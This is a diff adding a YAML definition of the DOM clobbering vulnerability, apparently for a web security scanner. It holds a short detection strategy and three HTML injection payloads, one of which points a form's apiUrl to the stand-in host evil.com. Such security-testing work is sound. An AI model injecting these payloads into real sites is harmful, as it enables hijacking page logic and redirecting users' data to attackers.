@@ -1,0 +1,20 @@
+id: DOM_CLOBBERING
+name: DOM Clobbering
+cwe:
+- CWE-79
+owasp: A03:2021 Injection
+severity_range: Medium - High
+description: Overwriting DOM properties via HTML injection to break JavaScript security logic or hijack variables.
+detection:
+  payloads:
+  - <a id="config"></a>
+  - <form id="config"><input name="apiUrl" value="//evil.com"></form>
+  - <iframe name="alert" srcdoc=""></iframe>
+  strategy:
+  - Identify HTML injection points (even where script tags are sanitized)
+  - Inject elements with id matching global JavaScript variables
+  - Check if the JS reads document.config or window.config — clobbering wins
+  - Test form-based clobbering to set nested object properties
+evidence_needed: JavaScript logic broken or hijacked via DOM property clobbering
+references:
+- https://portswigger.net/web-security/dom-based/dom-clobbering
